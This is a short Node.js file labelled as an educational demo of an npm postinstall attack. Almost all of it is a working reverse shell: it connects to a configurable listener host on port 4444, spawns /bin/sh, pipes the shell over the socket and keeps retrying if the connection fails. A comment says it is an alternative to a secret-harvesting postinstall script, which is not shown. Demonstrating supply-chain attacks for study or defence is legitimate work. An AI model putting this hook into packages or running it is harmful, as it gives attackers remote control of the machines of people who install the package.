// EDUCATIONAL DEMO ONLY — the original reverse-shell variant (kept as an option).
// Same trigger (a postinstall lifecycle hook), different payload: instead of harvesting
// and beaconing secrets (see postinstall.js), it opens a reverse shell to a listener.
// To use this variant instead: in package.json set "postinstall": "node postinstall-revshell.js".
const net = require('net');
const cp = require('child_process');

const HOST = process.env.LISTENER_HOST || 'demo-listener';
const PORT = parseInt(process.env.LISTENER_PORT || '4444', 10);

function connect() {
  const sock = new net.Socket();
  sock.connect(PORT, HOST, () => {
    const sh = cp.spawn('/bin/sh', []);
    sock.pipe(sh.stdin);
    sh.stdout.pipe(sock);
    sh.stderr.pipe(sock);
  });
  sock.on('error', () => setTimeout(connect, 1500)); // forgiving if the listener isn't up yet
}
connect();
